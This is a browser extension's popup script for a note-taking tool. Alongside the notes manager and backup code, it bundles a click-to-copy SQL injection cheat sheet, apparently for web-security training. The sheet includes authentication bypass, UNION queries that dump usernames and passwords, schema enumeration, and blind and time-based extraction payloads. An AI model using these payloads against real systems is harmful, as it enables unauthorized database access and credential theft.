// QuickNote - Popup logic
// Tabs: Notes manager, Cheat sheet, Backup.

'use strict';

// ---------------------------------------------------------------------------
// Built-in SQL injection cheat sheet (PortSwigger Web Security Academy style).
// Click a payload to copy it. Edit/extend freely.
// ---------------------------------------------------------------------------
var CHEAT_SHEET = [
  {
    category: 'Detect & confirm',
    items: [
      { p: "'", d: 'Break the query — look for an error' },
      { p: "''", d: 'Two quotes — error disappears? confirms SQLi' },
      { p: "' OR '1'='1", d: 'Always-true condition' },
      { p: "' OR 1=1-- -", d: 'Always true, comment out the rest' },
      { p: "admin'-- -", d: 'Auth bypass: log in as admin' }
    ]
  },
  {
    category: 'Comments',
    items: [
      { p: '-- -', d: 'MySQL/MSSQL/Postgres line comment (note the space)' },
      { p: '#', d: 'MySQL line comment' },
      { p: '/*comment*/', d: 'Inline comment' },
      { p: '--', d: 'Oracle / MSSQL line comment' }
    ]
  },
  {
    category: 'UNION — column count',
    items: [
      { p: "' ORDER BY 1-- -", d: 'Increment until it errors → column count' },
      { p: "' UNION SELECT NULL-- -", d: 'Add NULLs until no error' },
      { p: "' UNION SELECT NULL,NULL-- -", d: '2 columns' },
      { p: "' UNION SELECT NULL,NULL,NULL-- -", d: '3 columns' },
      { p: "' UNION SELECT NULL,NULL,NULL FROM dual-- -", d: 'Oracle needs FROM dual' }
    ]
  },
  {
    category: 'UNION — find text column',
    items: [
      { p: "' UNION SELECT 'a',NULL,NULL-- -", d: 'Swap each NULL for a string' },
      { p: "' UNION SELECT username, password FROM users-- -", d: 'Dump creds (2 cols)' },
      { p: "' UNION SELECT username||'~'||password FROM users-- -", d: 'Concat into one col (Oracle/Postgres)' },
      { p: "' UNION SELECT CONCAT(username,':',password) FROM users-- -", d: 'Concat (MySQL)' }
    ]
  },
  {
    category: 'DB version',
    items: [
      { p: "' UNION SELECT @@version-- -", d: 'MySQL / MSSQL' },
      { p: "' UNION SELECT version()-- -", d: 'PostgreSQL' },
      { p: "' UNION SELECT banner FROM v$version-- -", d: 'Oracle' },
      { p: "' UNION SELECT sqlite_version()-- -", d: 'SQLite' }
    ]
  },
  {
    category: 'List tables & columns',
    items: [
      { p: "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", d: 'MySQL/MSSQL/Postgres' },
      { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", d: 'Columns of a table' },
      { p: "' UNION SELECT table_name,NULL FROM all_tables-- -", d: 'Oracle tables' },
      { p: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -", d: 'Oracle columns' }
    ]
  },
  {
    category: 'Blind — conditional',
    items: [
      { p: "' AND '1'='1", d: 'True condition (page normal)' },
      { p: "' AND '1'='2", d: 'False condition (page differs)' },
      { p: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a", d: 'Confirm row exists' },
      { p: "' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a", d: 'Extract char-by-char' }
    ]
  },
  {
    category: 'Blind — time delay',
    items: [
      { p: "'; SELECT SLEEP(5)-- -", d: 'MySQL' },
      { p: "'; SELECT pg_sleep(5)-- -", d: 'PostgreSQL' },
      { p: "'; WAITFOR DELAY '0:0:5'-- -", d: 'MSSQL' },
      { p: "' || (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual)-- -", d: 'Oracle time-based' }
    ]
  }
];

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------
function copyToClipboard(text) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    return navigator.clipboard.writeText(text).catch(function () { return fallback(text); });
  }
  return fallback(text);
  function fallback(t) {
    var ta = document.createElement('textarea');
    ta.value = t;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); } catch (e) { /* no-op */ }
    ta.remove();
    return Promise.resolve();
  }
}

function hostFromUrl(url) {
  try { return new URL(url).host; } catch (e) { return url; }
}

var COLORS = ['yellow', 'blue', 'green', 'pink'];
function safeColor(c) { return COLORS.indexOf(c) !== -1 ? c : 'yellow'; }

function flash(el, cls) {
  el.classList.add(cls);
  setTimeout(function () { el.classList.remove(cls); }, 1000);
}

// ---------------------------------------------------------------------------
// Load all notes (page buckets + global) into a flat list for the manager.
// ---------------------------------------------------------------------------
function getAllNotes(cb) {
  chrome.storage.local.get(['notes', 'global'], function (result) {
    var buckets = result.notes || {};
    var global = result.global || [];
    var flat = [];
    Object.keys(buckets).forEach(function (url) {
      buckets[url].forEach(function (n) {
        flat.push({ note: n, url: url });
      });
    });
    global.forEach(function (n) { flat.push({ note: n, url: null }); });
    cb(flat);
  });
}

// ---------------------------------------------------------------------------
// Stats
// ---------------------------------------------------------------------------
function renderStats() {
  chrome.runtime.sendMessage({ action: 'getStats' }, function (response) {
    if (chrome.runtime.lastError || !response) return;
    setText('totalNotes', response.totalNotes || 0);
    setText('totalPages', response.totalPages || 0);
    setText('globalNotes', response.globalNotes || 0);
  });
}
function setText(id, val) {
  var el = document.getElementById(id);
  if (el) el.textContent = val;
}

// ---------------------------------------------------------------------------
// Notes manager
// ---------------------------------------------------------------------------
var allNotesCache = [];

function renderNotesList(filter) {
  var listEl = document.getElementById('notesList');
  var emptyEl = document.getElementById('notesEmpty');
  listEl.textContent = '';

  var q = (filter || '').toLowerCase();
  var items = allNotesCache.filter(function (entry) {
    if (!q) return true;
    var hay = (entry.note.content || '') + ' ' + (entry.url || 'global');
    return hay.toLowerCase().indexOf(q) !== -1;
  });

  if (allNotesCache.length === 0) {
    emptyEl.hidden = false;
    return;
  }
  emptyEl.hidden = true;

  if (items.length === 0) {
    var none = document.createElement('div');
    none.className = 'empty';
    none.textContent = 'No notes match “' + filter + '”.';
    listEl.appendChild(none);
    return;
  }

  items.forEach(function (entry) {
    listEl.appendChild(buildNoteItem(entry));
  });
}

function buildNoteItem(entry) {
  var note = entry.note;
  var isGlobal = note.scope === 'global';

  var item = document.createElement('div');
  item.className = 'note-item';

  var top = document.createElement('div');
  top.className = 'note-item-top';

  var swatch = document.createElement('span');
  swatch.className = 'note-swatch note-swatch-' + safeColor(note.color);
  top.appendChild(swatch);

  if (isGlobal) {
    var badge = document.createElement('span');
    badge.className = 'note-badge';
    badge.textContent = '🌐 Global';
    top.appendChild(badge);
  }

  var host = document.createElement('span');
  host.className = 'note-host';
  host.textContent = isGlobal ? 'every page' : hostFromUrl(entry.url);
  host.title = isGlobal ? 'Shown on every page' : entry.url;
  top.appendChild(host);

  var preview = document.createElement('div');
  preview.className = 'note-preview';
  if (note.content && note.content.trim()) {
    preview.textContent = note.content;
    preview.title = note.content;
  } else {
    preview.className += ' note-empty-preview';
    preview.textContent = '(empty note)';
  }

  var actions = document.createElement('div');
  actions.className = 'note-actions';

  var copyBtn = document.createElement('button');
  copyBtn.className = 'note-action';
  copyBtn.textContent = 'Copy';
  copyBtn.onclick = function () {
    copyToClipboard(note.content || '').then(function () {
      copyBtn.textContent = 'Copied ✓';
      copyBtn.classList.add('copied');
      setTimeout(function () { copyBtn.textContent = 'Copy'; copyBtn.classList.remove('copied'); }, 1000);
    });
  };

  var revealBtn = document.createElement('button');
  revealBtn.className = 'note-action';
  revealBtn.textContent = 'Reveal';
  revealBtn.title = 'Show this note on the current page';
  revealBtn.onclick = function () { revealOnPage(note.id); };

  var delBtn = document.createElement('button');
  delBtn.className = 'note-action note-action-del';
  delBtn.textContent = 'Delete';
  delBtn.onclick = function () { deleteNote(entry); };

  actions.appendChild(copyBtn);
  actions.appendChild(revealBtn);
  actions.appendChild(delBtn);

  item.appendChild(top);
  item.appendChild(preview);
  item.appendChild(actions);
  return item;
}

function revealOnPage(noteId) {
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    if (!tabs[0]) return;
    chrome.tabs.sendMessage(tabs[0].id, { action: 'revealNote', noteId: noteId }, function () {
      // Ignore errors (note may belong to a different page); close popup so the
      // user can see the revealed note.
      if (!chrome.runtime.lastError) window.close();
    });
  });
}

function deleteNote(entry) {
  var note = entry.note;
  chrome.storage.local.get(['notes', 'global'], function (result) {
    var buckets = result.notes || {};
    var global = result.global || [];
    if (note.scope === 'global') {
      global = global.filter(function (n) { return n.id !== note.id; });
      chrome.storage.local.set({ global: global }, afterDelete);
    } else {
      if (buckets[entry.url]) {
        buckets[entry.url] = buckets[entry.url].filter(function (n) { return n.id !== note.id; });
        if (buckets[entry.url].length === 0) delete buckets[entry.url];
      }
      chrome.storage.local.set({ notes: buckets }, afterDelete);
    }
  });
  function afterDelete() {
    refreshNotes();
    renderStats();
  }
}

function refreshNotes() {
  getAllNotes(function (flat) {
    allNotesCache = flat;
    var search = document.getElementById('noteSearch');
    renderNotesList(search ? search.value : '');
  });
}

// ---------------------------------------------------------------------------
// Cheat sheet
// ---------------------------------------------------------------------------
function renderCheatSheet(filter) {
  var listEl = document.getElementById('cheatList');
  listEl.textContent = '';
  var q = (filter || '').toLowerCase();

  CHEAT_SHEET.forEach(function (cat) {
    var matches = cat.items.filter(function (it) {
      if (!q) return true;
      return (it.p + ' ' + it.d + ' ' + cat.category).toLowerCase().indexOf(q) !== -1;
    });
    if (matches.length === 0) return;

    var title = document.createElement('div');
    title.className = 'cheat-cat-title';
    title.textContent = cat.category;
    listEl.appendChild(title);

    matches.forEach(function (it) {
      var row = document.createElement('div');
      row.className = 'cheat-item';
      row.title = 'Click to copy';

      var textWrap = document.createElement('div');
      textWrap.style.flex = '1';

      var payload = document.createElement('span');
      payload.className = 'cheat-payload';
      payload.textContent = it.p;

      var desc = document.createElement('span');
      desc.className = 'cheat-desc';
      desc.textContent = it.d;

      textWrap.appendChild(payload);
      textWrap.appendChild(desc);

      var icon = document.createElement('span');
      icon.className = 'cheat-copy-icon';
      icon.textContent = '⧉';

      row.appendChild(textWrap);
      row.appendChild(icon);

      row.onclick = function () {
        copyToClipboard(it.p).then(function () {
          icon.textContent = '✓';
          row.classList.add('copied');
          setTimeout(function () { icon.textContent = '⧉'; row.classList.remove('copied'); }, 1000);
        });
      };

      listEl.appendChild(row);
    });
  });
}

// ---------------------------------------------------------------------------
// Backup: export / import
// ---------------------------------------------------------------------------
function exportNotes() {
  chrome.storage.local.get(['notes', 'global'], function (result) {
    var data = {
      app: 'QuickNote',
      version: 2,
      exportedAt: new Date().toISOString(),
      notes: result.notes || {},
      global: result.global || []
    };
    var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'quicknote-backup-' + new Date().toISOString().slice(0, 10) + '.json';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
    showBackupMsg('Exported successfully.', false);
  });
}

function importNotes(file) {
  var reader = new FileReader();
  reader.onload = function () {
    var data;
    try {
      data = JSON.parse(reader.result);
    } catch (e) {
      showBackupMsg('Invalid JSON file.', true);
      return;
    }
    if (!data || (typeof data.notes !== 'object' && !Array.isArray(data.global))) {
      showBackupMsg('This does not look like a QuickNote backup.', true);
      return;
    }

    chrome.storage.local.get(['notes', 'global'], function (result) {
      var buckets = result.notes || {};
      var global = result.global || [];
      var added = 0;

      // Merge page notes, skipping duplicate IDs.
      var incoming = data.notes || {};
      Object.keys(incoming).forEach(function (url) {
        if (!buckets[url]) buckets[url] = [];
        var existingIds = {};
        buckets[url].forEach(function (n) { existingIds[n.id] = true; });
        incoming[url].forEach(function (n) {
          if (!existingIds[n.id]) { buckets[url].push(n); added++; }
        });
      });

      // Merge global notes.
      var globalIds = {};
      global.forEach(function (n) { globalIds[n.id] = true; });
      (data.global || []).forEach(function (n) {
        if (!globalIds[n.id]) { global.push(n); added++; }
      });

      chrome.storage.local.set({ notes: buckets, global: global }, function () {
        showBackupMsg('Imported ' + added + ' note(s).', false);
        refreshNotes();
        renderStats();
      });
    });
  };
  reader.onerror = function () { showBackupMsg('Could not read the file.', true); };
  reader.readAsText(file);
}

function showBackupMsg(text, isError) {
  var el = document.getElementById('backupMsg');
  el.textContent = text;
  el.hidden = false;
  el.classList.toggle('error', !!isError);
}

// ---------------------------------------------------------------------------
// Tabs + wiring
// ---------------------------------------------------------------------------
function initTabs() {
  var tabs = document.querySelectorAll('.tab');
  tabs.forEach(function (tab) {
    tab.onclick = function () {
      tabs.forEach(function (t) { t.classList.remove('tab-active'); });
      tab.classList.add('tab-active');
      document.querySelectorAll('.panel').forEach(function (p) { p.classList.remove('panel-active'); });
      var panel = document.getElementById('panel-' + tab.getAttribute('data-tab'));
      if (panel) panel.classList.add('panel-active');
    };
  });
}

document.addEventListener('DOMContentLoaded', function () {
  initTabs();
  renderStats();
  refreshNotes();
  renderCheatSheet('');

  document.getElementById('noteSearch').addEventListener('input', function (e) {
    renderNotesList(e.target.value);
  });
  document.getElementById('cheatSearch').addEventListener('input', function (e) {
    renderCheatSheet(e.target.value);
  });
  document.getElementById('exportBtn').addEventListener('click', exportNotes);
  document.getElementById('importFile').addEventListener('change', function (e) {
    if (e.target.files && e.target.files[0]) importNotes(e.target.files[0]);
    e.target.value = '';
  });
});
